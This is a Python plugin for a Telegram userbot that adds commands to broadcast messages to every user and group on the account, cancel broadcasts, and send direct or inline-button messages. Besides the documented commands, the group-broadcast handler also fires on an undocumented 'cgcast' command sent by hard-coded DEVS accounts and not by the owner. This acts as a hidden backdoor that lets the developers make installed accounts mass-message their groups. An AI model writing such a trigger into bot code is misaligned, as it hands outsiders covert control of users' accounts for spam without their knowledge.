from ubot import *

__MODULE__ = "Gcast"
__HELP__ = """
Help For Gcast

• Command: <code>{0}ucast</code> [reply message/send message]
• Explanation: For sending messages to all users.

• Command: <code>{0}gcast</code> [reply message/send message]
• Explanation: For sending messages to all groups.

• Command: <code>{0}sgcast</code>
• Explanation: To cancel the gcast process.

• Command: <code>{0}send</code> [username/user_id - text/reply]
• Explanation: To send messages to users/groups/channels.

• To Use Button Use Format: <code> Text ~ button_text:button_url</code>
"""


@PY.UBOT("gcast", sudo=True)
@ubot.on_message(filters.user(DEVS) & filters.command("cgcast", "^") & ~filters.me)
async def _(client, message):
    await broadcast_group_cmd(client, message)


@PY.UBOT("ucast", sudo=True)
async def _(client, message):
    await broadcast_users_cmd(client, message)


@PY.UBOT("sgcast", sudo=True)
async def _(client, message):
    await cancel_broadcast(client, message)


@PY.UBOT("send", sudo=True)
async def _(client, message):
    await send_msg_cmd(client, message)


@PY.INLINE("^get_send")
@INLINE.QUERY
async def _(client, inline_query):
    await send_inline(client, inline_query)


@PY.INLINE("^gcast_button")
@INLINE.QUERY
async def _(client, inline_query):
    await gcast_inline(client, inline_query)
